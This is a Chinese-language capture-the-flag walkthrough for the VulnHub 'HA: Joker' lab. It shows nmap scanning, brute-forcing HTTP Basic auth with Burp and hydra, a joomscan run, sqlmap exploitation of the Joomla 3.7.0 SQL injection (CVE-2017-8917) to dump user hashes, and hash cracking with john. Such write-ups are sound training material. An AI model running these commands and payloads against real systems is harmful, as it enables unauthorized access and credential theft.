<center>joker</center>





[toc]







## joker

> vulnhub: [joker](https://www.vulnhub.com/entry/ha-joker,379/)



> Description: 

```shell
This lab is going to introduce a little anarchy. It will upset the established order, and everything becomes will become chaos. Get your face painted and wear that Purple suit because it’s time to channel your inner Joker. This is a boot2root lab. Getting the root flag is ultimate goal.

ENUMERATION IS THE KEY!!!!!  # 枚举是关键。
```





### 1. 信息收集

```shell
nmap -sP 172.16.168.128/24

Nmap scan report for 172.16.168.135
Host is up (0.00048s latency).
MAC Address: 00:0C:29:D8:05:4E (VMware)

# 端口扫描
nmap -p- 172.16.168.135 -A

22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
|_  256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HA: Joker
|_http-server-header: Apache/2.4.29 (Ubuntu)
8080/tcp open  http    Apache httpd 2.4.29
|_http-title: 401 Unauthorized
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
```

> `ip` 和`端口`







### 2. 爆破 密码

> 枚举是关键。

```shell
1. 80 端口  单页没有任何信息
2. 8080 端口 需要登陆用户名和密码
```

1. burp爆破

> burp 抓包

```shell
# 登陆信息 加密了
Authorization: Basic YWRtaW46MTIz

# 发送到Decoder  Base64解密
admin:123
用户名：密码=>base64加密

# 发送到intruder爆破 type: Custom inerator自定义模式
position： 1 => 用户名
position : 2 => :
position : 3 => 密码
# 可以使用字典。/usr/share/wordlists
# payload processing => Eecode => base64-decode 
start atttack

# 看长度不同的包，发送到decoder解密。就是我们的密码和账号
joker:hannah
```

2. hydra爆破

```shell
# -L 用户名文件 只能IP
hydra -l joker -P /usr/share/wordlists/rockyou.txt 172.16.168.135 -s 8080 http-get
```







### 3. web CMS

> wappalyzer: 插件查看使用的技术

![image-20241125092713352](./assets/image-20241125092713352.png)

> joomla: CMS

```shell
# joomal扫描
joomscan -u http://joker:hannah@172.16.168.135:8080/

[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.0

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://joker:hannah@172.16.168.135:8080/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://joker:hannah@172.16.168.135:8080/robots.txt 
```

> 版本： `Joomla 3.7.0`

```shell
# 搜索漏洞 和 有一个靶场一样
searchsploit Joomla 3.7.0

# sql注入漏洞  php/webapps/42033.txt  查看漏洞信息
searchsploit -p 42033

# 详细信息
cat /usr/share/exploitdb/exploits/php/webapps/42033.txt

# Exploit Title: Joomla 3.7.0 - Sql Injection
# Date: 05-19-2017
# Exploit Author: Mateus Lino
# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
# Vendor Homepage: https://www.joomla.org/
# Version: = 3.7.0
# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
# CVE : - CVE-2017-8917


URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27


Using Sqlmap:

sqlmap -u "http://joker:hannah@172.16.168.135:8080/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

```shell

# 数据库信息
available databases [2]:
[*] information_schema
[*] joomladb


# 2 指定数据库，获取表名
sqlmap -u "http://joker:hannah@172.16.168.135:8080/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb --tables

# 3. dump #__users表列名
sqlmap -u "http://joker:hannah@172.16.168.135:8080/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T "#__users" --columns

# 4. dump #__users表数据 
sqlmap -u "http://joker:hannah@172.16.168.135:8080/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T "#__users" -C username,password -dump
```

```shell
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| joomla   | $2y$10$eTtGk9VzhAt9Psr66eu3TONbi.fXL6A/ToAi7UnYNFLDv8n2I8K5u |
+----------+--------------------------------------------------------------+
```

````shell
# 解密
> 解密 password

```shell
touch pass.txt

john --show pass.txt

# hashid 识别是什么加密 hashid
sudo apt install hashid 
hashid pass.txt

# 指定 加密方法
sudo john 1.txt --format=bcrypt
sudo john --show pass.txt

?:snoopy # snoopy 密码
```
````

> 解不开，知道用户名还是用`burp爆破`

```shell
joomla/joomla
```



